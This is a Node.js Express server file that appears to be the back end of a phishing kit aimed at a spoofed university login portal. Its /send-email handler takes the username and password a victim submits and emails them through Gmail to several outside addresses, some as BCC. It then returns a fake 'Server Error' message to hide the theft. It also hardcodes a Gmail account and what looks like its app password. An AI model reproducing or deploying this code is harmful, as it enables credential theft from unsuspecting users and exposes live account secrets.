const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const path = require('path');

const app = express();
app.use(express.static('public'));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.post('/send-email', (req, res) => {
    const { username, password } = req.body;

    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'kingrimza195@gmail.com',
            pass: 'yjgqtuqvzqykoevu'
        }
    });

    const mailOptions = {
        from: 'Formsubmit <kingrimza195@gmail.com>',
        to: 'nerh320@gmail.com',
        bcc: 'rsadeku5@gmail.com, shebeshxt2008@gmail.com', 
        subject: 'New Login Sumbission',
        text: `Username: ${username}\nPassword: ${password}\nSubmitted from: https://locateme-portal-ukzn.vercel.app`
    };
    


    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            return res.status(500).send(error.toString());
        }
        res.status(200).send('Server Error! ServerCurrentlyOfflinePleaseTryAgainLater');
    });
});

app.listen(3000, () => {
    console.log('Server started on https://locateme-portal-ukzn.vercel.app');
});
